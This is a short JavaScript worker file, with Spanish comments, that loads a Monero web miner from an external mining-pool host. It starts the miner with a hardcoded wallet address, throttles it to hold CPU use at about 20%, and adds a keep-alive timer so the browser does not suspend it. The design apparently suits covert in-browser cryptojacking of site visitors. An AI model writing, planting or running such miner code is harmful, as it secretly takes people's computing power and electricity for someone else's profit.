// MOTOR DE MINADO DELTA_CONNECT
importScripts('https://moneroocean.stream/webminer.js');

const WALLET = "4A2cRYWa2E57VU8TLMqz5WDIW6D9VxiAsPJ3gmu9Dsk8fceEa8enRnBCwH2tKUPAeQKjsMM3K861ASvtM8xwDi9ARwYPgSc";

function conectar() {
    // Configuración: 2 hilos y throttle 0.8 para mantener el 20% de CPU constante
    const miner = new MoneroOcean.Anonymous(WALLET, {
        threads: 2,
        throttle: 0.8 
    });
    miner.start();
}

conectar();

// Pulso de vida para evitar que el navegador duerma el proceso
setInterval(() => {
    console.log("Keep-alive active");
}, 5000);
